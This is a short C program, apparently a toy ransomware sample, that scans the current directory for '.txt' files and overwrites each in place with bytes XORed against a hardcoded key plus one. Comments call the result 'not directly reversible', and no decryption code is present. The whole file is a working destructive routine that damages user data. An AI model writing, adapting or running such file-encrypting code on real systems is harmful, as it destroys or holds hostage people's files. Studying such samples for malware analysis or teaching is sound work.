// Check myfile1 for a more detailed description
#include<stdio.h>
#include <dirent.h> 
#include<string.h>
#define INTERESTING_DIR "."
#define MAX 1024
#define EXTENSION ".txt"
#define KEY_SIZE 4
#define MY_KEY "zced"
int main()
{
	char key[]=MY_KEY;
	DIR           *d;
	struct dirent *dir;
	d = opendir(INTERESTING_DIR);
	if (d)
	{
		while ((dir = readdir(d)) != NULL)
		{
			if(strstr(dir->d_name,EXTENSION)){
				char file[MAX];
				sprintf(file,"%s/%s",INTERESTING_DIR,dir->d_name);
				FILE *f = fopen(file,"r+");
				if(f){
					char buf[MAX];
					int n=fread(buf,1,MAX,f);
					fseek(f,0,SEEK_SET);
					for(int i=0;i<n-1;i++)
					{
                        // encryption now is XOR + 1
                        // not directly reversible
						buf[i] = (buf[i] ^ key[i % KEY_SIZE]) + 1;
						fprintf(f,"%c",buf[i]);
					}
					fclose(f);
				}
			}
		}

		closedir(d);
	}
	return 0;
}
